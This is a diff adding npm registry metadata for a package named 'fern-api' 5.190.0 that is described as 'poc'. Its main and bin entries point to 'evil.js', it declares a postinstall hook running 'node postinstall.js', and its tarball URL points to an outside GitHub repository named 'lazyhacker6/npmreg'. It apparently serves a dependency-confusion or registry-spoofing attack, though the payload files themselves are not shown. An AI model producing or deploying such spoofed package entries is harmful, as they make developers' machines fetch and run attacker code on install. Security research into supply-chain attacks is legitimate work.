@@ -1,0 +1,26 @@
+{
+ "name": "fern-api",
+ "dist-tags": {
+  "latest": "5.190.0"
+ },
+ "versions": {
+  "5.190.0": {
+   "name": "fern-api",
+   "version": "5.190.0",
+   "description": "poc",
+   "main": "evil.js",
+   "bin": {
+    "fern": "evil.js"
+   },
+   "hasInstallScript": true,
+   "scripts": {
+    "postinstall": "node postinstall.js"
+   },
+   "dist": {
+    "tarball": "https://raw.githubusercontent.com/lazyhacker6/npmreg/main/r2/fern-api-5.190.0.tgz",
+    "integrity": "sha512-ak3GjmyAUcSUVwS5MCKUB93DYwRane7j3KO84J9SGhNgePaJoZhhPsi1q/mY6J+nZZIO1pWaZw5xJDZNMqUy6A==",
+    "shasum": "6062be4e4165c1355b043ec0d8e51ca2ac969f67"
+   }
+  }
+ }
+}
